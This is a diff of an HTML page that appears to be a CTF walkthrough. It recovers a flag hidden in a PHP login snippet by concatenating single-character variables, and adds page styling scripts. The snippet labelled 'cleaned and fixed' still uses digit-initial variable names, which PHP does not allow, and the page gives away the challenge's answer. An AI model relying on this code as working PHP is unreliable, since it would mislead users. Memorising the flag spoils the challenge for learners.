+      <pre><button class="copy" data-target="php-raw" aria-label="Copy raw PHP code">Copy</button><code id="php-raw" class="language-php">&lt;?php if($_SERVER["REQUEST_METHOD"]=="POST"){$9="B";$3="A";$4="K";$5="{";$11="}";$6="T";$username=$_POST["username"];$password=$_POST["password"];$8="_";$2="3";$pdo=new PDO("mysql:host=localhost;dbname=mydatabase","username","password");$10="S";$7="H";$1="L";$flag=$1.$2.$3.$4.$5.$6.$7.$8.$9.$10.$11;$stmt=$pdo;prepare("SELECT * FROM users WHERE username=?");$stmt execute([$username]);$user=$stmt fetch();if($user&&password_verify($password,$user['password'])){session_start();$_SESSION['user_id']=$user['id'];echo"Welcome,".htmlspecialchars($user['username'])."this is your flag".$flag."!";}else{echo"Invalid username or password.";}}?></code></pre>
+
+      <h2 tabindex="0">PHP Code Analysis</h2>
+      <p>The code uses single-character variable names and concatenation to build the flag. For clarity, here's a cleaned and fixed version of the PHP snippet discovered:</p>
+      <pre><button class="copy" data-target="php-clean" aria-label="Copy cleaned PHP code">Copy</button><code id="php-clean" class="language-php">&lt;?php 
+if($_SERVER["REQUEST_METHOD"]=="POST"){ 
+    $9="B"; $3="A"; $4="K"; $5="{"; $11="}"; $6="T"; 
+    $username=$_POST["username"]; $password=$_POST["password"]; $8="_"; $2="3"; 
+    $pdo=new PDO("mysql:host=localhost;dbname=mydatabase","username","password"); 
+    $10="S"; $7="H"; $1="L"; 
+    $flag=$1.$2.$3.$4.$5.$6.$7.$8.$9.$10.$11; 
+    $stmt=$pdo->prepare("SELECT * FROM users WHERE username=?"); 
+    $stmt->execute([$username]); $user=$stmt->fetch(); 
+    if($user && password_verify($password, $user['password'])){ 
+        session_start(); 
+        $_SESSION['user_id']=$user['id']; 
+        echo "Welcome, ".htmlspecialchars($user['username']).", this is your flag: ".$flag."!"; 
+    } else { 
+        echo "Invalid username or password."; 
+    } 
+} 
+?></code></pre>
+
+      <h2 id="flag" tabindex="0">Flag reconstruction</h2>
+      <p>Substitute the single-character variables and concatenate them to get the flag characters:</p>
+      <pre><code class="language-bash">$1 = "L"
+$2 = "3"
+$3 = "A"
+$4 = "K"
+$5 = "{"
+$6 = "T"
+$7 = "H"
+$8 = "_"
+$9 = "B"
+$10 = "S"
+$11 = "}"
+
+# -> L3AK{TH_BS}</code></pre>
+
+      <div class="note" id="end" tabindex="0">So, the final flag is:</div>
+      <h2 style="text-align:center; color: var(--color-accent); font-weight: 900; font-size: 36px; text-shadow: 0 0 20px var(--color-accent);" tabindex="0">L3AK{TH_BS}</h2>
+
+      <footer>
+        &copy; 2024 0xYumeko — Walkthrough created for TryHackMe L3ak_CTF
+      </footer>
+    </article>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <script>
+    // Dark/light mode toggle
+    const toggleBtn = document.getElementById('toggle-mode');
+    toggleBtn.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      toggleBtn.textContent = document.body.classList.contains('light') ? '☀️' : '🌙';
+    });
+
+    // Scroll reveal images animation
+    const images = document.querySelectorAll('.image-section img');
+    const revealOnScroll = () => {
+      const triggerBottom = window.innerHeight * 0.85;
+      images.forEach(img => {
+        const imgTop = img.getBoundingClientRect().top;
+        if (imgTop < triggerBottom) {
+          img.classList.add('visible');
+        }
+      });
+    };
+    window.addEventListener('scroll', revealOnScroll);
+    window.addEventListener('load', revealOnScroll);
+
+    // Copy buttons functionality
+    document.querySelectorAll('button.copy').forEach(button => {
+      button.addEventListener('click', () => {
+        const targetId = button.getAttribute('data-target');
+        const code = document.getElementById(targetId).innerText;
+        navigator.clipboard.writeText(code).then(() => {
+          button.textContent = 'Copied ✓';
+          setTimeout(() => button.textContent = 'Copy', 1500);
         });
-
-        // Image zoom effect
-        document.querySelectorAll('.image-container img').forEach(img => {
-            img.addEventListener('click', function() {
-                const overlay = document.createElement('div');
-                overlay.className = 'zoom-overlay';
-                
-                const zoomedImg = document.createElement('img');
-                zoomedImg.src = this.src;
-                zoomedImg.alt = this.alt;
-                
-                const closeBtn = document.createElement('span');
-                closeBtn.className = 'close-zoom';
-                closeBtn.innerHTML = '&times;';
-                
-                overlay.appendChild(zoomedImg);
-                overlay.appendChild(closeBtn);
-                document.body.appendChild(overlay);
-                
-                closeBtn.addEventListener('click', () => {
-                    document.body.removeChild(overlay);
-                });
-                
-                overlay.addEventListener('click', (e) => {
-                    if (e.target === overlay) {
-                        document.body.removeChild(overlay);
-                    }
-                });
-            });
-        });
-
-        // Animate elements when they come into view
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }
-            });
-        }, { threshold: 0.1 });
-
-        document.querySelectorAll('.card').forEach(card => {
-            card.style.opacity = '0';
-            card.style.transform = 'translateY(20px)';
-            card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
-            observer.observe(card);
-        });
-
-        // Typewriter effect for title
-        const title = document.querySelector('h1');
-        const originalText = title.textContent;
-        title.textContent = '';
-        
-        let i = 0;
-        const typeWriter = () => {
-            if (i < originalText.length) {
-                title.textContent += originalText.charAt(i);
-                i++;
-                setTimeout(typeWriter, 50);
-            }
-        };
-        
-        setTimeout(typeWriter, 1000);
-    </script>
+      });
+    });
+  </script>
 </body>
 </html>
